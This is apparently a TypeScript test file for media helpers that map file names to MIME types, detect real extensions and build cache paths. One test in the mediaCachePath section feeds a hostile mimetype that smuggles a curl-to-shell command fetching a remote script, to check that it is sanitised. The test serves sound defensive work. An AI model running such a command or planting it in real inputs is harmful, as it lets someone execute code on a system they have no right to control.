import { describe, expect, it } from "bun:test";
import { knownFileExt, mediaCachePath, mimetypeForFile } from "./media.ts";

describe("mimetypeForFile", () => {
  it("maps common document extensions to their real type, not baileys' pdf default", () => {
    const cases: Record<string, string> = {
      "/tmp/report.csv": "text/csv",
      "/tmp/report.xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      "/tmp/notes.md": "text/markdown",
      "/tmp/Morning_Ride.gpx": "application/gpx+xml",
      "/tmp/archive.zip": "application/zip",
      "/tmp/deck.pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
      "/tmp/letter.docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      "/tmp/paper.pdf": "application/pdf",
      "/tmp/song.mp3": "audio/mpeg",
    };
    for (const [path, mime] of Object.entries(cases)) {
      expect(mimetypeForFile(path)).toBe(mime);
    }
  });

  it("ignores extension case (Bun's own lookup is case-sensitive)", () => {
    expect(mimetypeForFile("/tmp/SCAN0001.PDF")).toBe("application/pdf");
    expect(mimetypeForFile("/tmp/Report.XLSX")).toBe("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
    expect(mimetypeForFile("/tmp/Data.Csv")).toBe("text/csv");
  });

  it("drops charset parameters", () => {
    expect(mimetypeForFile("/tmp/readme.txt")).toBe("text/plain");
    expect(mimetypeForFile("/tmp/data.json")).toBe("application/json");
  });

  it("falls back to octet-stream for unknown or missing extensions", () => {
    expect(mimetypeForFile("/tmp/ride.fit")).toBe("application/octet-stream");
    expect(mimetypeForFile("/tmp/no-extension")).toBe("application/octet-stream");
  });
});

describe("knownFileExt", () => {
  it("returns a real extension, lowercased", () => {
    expect(knownFileExt("directory.xlsx")).toBe("xlsx");
    expect(knownFileExt("SCAN0001.PDF")).toBe("pdf");
  });

  it("ignores dotted names that are not extensions", () => {
    for (const name of ["Contract v1.2", "Scan 08.10.2026", "Invoice No.123", "Report", "", null, undefined]) {
      expect(knownFileExt(name)).toBeUndefined();
    }
  });
});

describe("mediaCachePath", () => {
  it("prefers the document's own extension over a lying mimetype", () => {
    expect(mediaCachePath("ID1", "application/pdf", "directory.xlsx")).toEndWith("/ID1.xlsx");
    expect(mediaCachePath("ID2", "application/pdf", "Report.CSV")).toEndWith("/ID2.csv");
  });

  it("falls back to the mimetype when the file name has no real extension", () => {
    expect(mediaCachePath("ID3", "application/pdf", "Report")).toEndWith("/ID3.pdf");
    expect(mediaCachePath("ID4", "application/pdf", "Contract v1.2")).toEndWith("/ID4.pdf");
    expect(mediaCachePath("ID5", "image/jpeg")).toEndWith("/ID5.jpg");
    expect(mediaCachePath("ID6", null, null)).toEndWith("/ID6.bin");
  });

  it("keeps only plain characters from a mimetype subtype", () => {
    expect(mediaCachePath("ID7", "application/vnd.ms-excel")).toEndWith("/ID7.vnd.ms-excel");
    expect(mediaCachePath("ID8", "audio/ogg; codecs=opus")).toEndWith("/ID8.ogg");
    expect(mediaCachePath("ID9", "x/$(curl${IFS}evil.sh|sh).pdf")).toEndWith("/ID9.bin");
  });
});
